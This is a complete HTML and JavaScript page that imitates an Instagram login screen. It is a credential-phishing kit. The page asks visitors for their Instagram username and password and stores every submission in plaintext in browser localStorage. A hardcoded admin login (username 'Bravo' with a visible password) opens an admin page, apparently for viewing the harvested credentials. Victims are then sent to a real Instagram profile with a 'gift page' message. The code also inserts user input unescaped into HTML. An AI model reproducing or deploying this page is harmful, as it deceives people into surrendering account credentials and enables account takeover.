<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: url('A.jpeg') no-repeat center center fixed;
      background-size: cover;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .login-container {
  margin-top: 25vh;
  background: transparent;
  padding: 40px;
  text-align: center;
  width: 300px;
  box-shadow: none;
  border: none;
  color: white;
}

    .login-container h1 {
      font-family: 'Billabong', cursive;
      font-size: 48px;
      margin-bottom: 10px;
    }
    .login-container h2 {
      font-size: 24px;
      margin-bottom: 5px;
    }
    .login-container p {
      font-size: 12px;
      color: #888;
      margin-bottom: 20px;
    }
    .login-container h1,
.login-container h2,
.login-container p {
  color: white;
}
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 5px;
      background: transparent;
      color: white;
      border: 1px solid white;
    }
    .eye-toggle {
      position: relative;
      display: flex;
      align-items: center;
      width: 100%;
    }
    
    .eye-toggle input {
      width: 100%;
      padding-right: 50px;
    }
    
    .eye-toggle span {
      position: absolute;
      right: 15px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      color: white;
      font-size: 14px;
    }
    button {
      background-color: #3897f0;
      color: white;
      padding: 10px;
      width: 100%;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-weight: bold;
    }
    #confirmPrompt {
  position: fixed;
  top: 0;
  left: 0;
  width: 100vw;
  height: 100vh;
  background: url('A.jpeg') no-repeat center center fixed;
  background-size: cover;
  display: none;
  justify-content: center;
  align-items: center;
  z-index: 1000;
}

#confirmPrompt div {
  background: rgba(0, 0, 0, 0.5); /* semi-transparent dark overlay */
  padding: 30px;
  color: white;
  font-size: 16px;
  max-width: 600px;
  width: 90%;
  border: none;
  box-shadow: 0 0 15px rgba(0,0,0,0.3);
  border-radius: 10px;
}

#confirmPrompt button {
  width: 45%;
  margin: 10px 2.5%;
  padding: 10px;
  border: none;
  border-radius: 5px;
  font-weight: bold;
  cursor: pointer;
  color: white;
}

#confirmPrompt button:first-child {
  background-color: #28a745; /* Confirm - green */
}

#confirmPrompt button:last-child {
  background-color: #dc3545; /* Cancel - red */
}

  </style>
</head>
<body>
  <div class="login-container" id="loginContainer">
    <h1>Instagram</h1>
    <h2>Welcome</h2>
    <p>Please log in with your Instagram credentials</p>
    <input type="text" id="username" placeholder="Username or email">
    <div class="eye-toggle">
      <input type="password" id="password" placeholder="Password" style="width: 100%;">
      <span id="toggleText" onclick="togglePassword()">Show</span>
    </div>

    <button onclick="confirmLogin()">Log In</button>
  </div>

  <div id="confirmPrompt"></div>

  <script>
    const entries = JSON.parse(localStorage.getItem('loginData')) || [];

    function togglePassword() {
      const pass = document.getElementById('password');
      const toggle = document.getElementById('toggleText');
      if (pass.type === 'password') {
        pass.type = 'text';
        toggle.textContent = 'Hide';
      } else {
        pass.type = 'password';
        toggle.textContent = 'Show';
      }
    }
    
    function toggleConfirmPass() {
      const input = document.getElementById('confirmPassInput');
      const toggle = document.getElementById('toggleConfirmText');
      if (input.type === 'password') {
        input.type = 'text';
        toggle.textContent = 'Hide';
      } else {
        input.type = 'password';
        toggle.textContent = 'Show';
      }
    }

    function confirmLogin() {
      const user = document.getElementById('username').value.trim();
      const pass = document.getElementById('password').value.trim();

      if (!user || !pass) {
        alert("Please fill in all fields.");
        return;
      }

     const container = document.getElementById('confirmPrompt');
      container.style.display = 'flex';
      document.getElementById('loginContainer').style.display = 'none'; 
      container.innerHTML = `
        <div style="text-align: center; width: 420px;">
          <h3 style="font-size: 22px; margin-bottom: 20px;">Confirm Your Details</h3>
          
          <div style="display: flex; align-items: center; justify-content: center; gap: 10px; margin: 10px 0;">
            <label for="confirmUserInput" style="font-size: 18px;">Username:</label>
            <input type="text" value="${user}" id="confirmUserInput" style="padding: 8px; border-radius: 5px; width: 60%; font-size: 16px;" readonly>
          </div>
      
          <div style="display: flex; align-items: center; justify-content: center; gap: 10px; margin: 10px 0;">
            <label for="confirmPassInput" style="font-size: 18px;">Password:</label>
            <input type="password" value="${pass}" id="confirmPassInput" style="padding: 8px; border-radius: 5px; width: 60%; font-size: 16px;">
            <span id="toggleConfirmText" onclick="toggleConfirmPass()" style="cursor:pointer;">Show</span>
          </div>
      
          <div style="display: flex; justify-content: space-between; margin-top: 20px;">
            <button onclick="handleConfirm('${user}', '${pass}')">Confirm</button>
            <button onclick="cancelPrompt()">Cancel</button>
          </div>
        </div>
      `;
  

    }

    function cancelPrompt() {
      document.getElementById('confirmPrompt').style.display = 'none';
      document.getElementById('loginContainer').style.display = 'block';
    }

    function handleConfirm(user, pass) {
      const container = document.getElementById('confirmPrompt');
      container.style.display = 'none';

      // Admin logic
      if (user === "Bravo" && pass === "Bravin,18794") {
        alert("Welcome Admin. Opening dashboard...");
        window.location.href = "admin.html";
        return;
      }

      // Check for existing
      const existing = entries.find(e => e.username === user && e.password === pass);
      const currentDate = new Date().toLocaleString();
      if (existing) {
        existing.date = currentDate;
      } else {
        entries.push({ username: user, password: pass, date: currentDate, deletable: true });
      }
      localStorage.setItem('loginData', JSON.stringify(entries));

      // Redirect
      alert("Redirecting to Instagram...");
      window.location.href = "https://instagram.com/bravo_momanyi?text=I%20found%20you%20on%20your%20gift%20page";
    }
  </script>
</body>
</html>
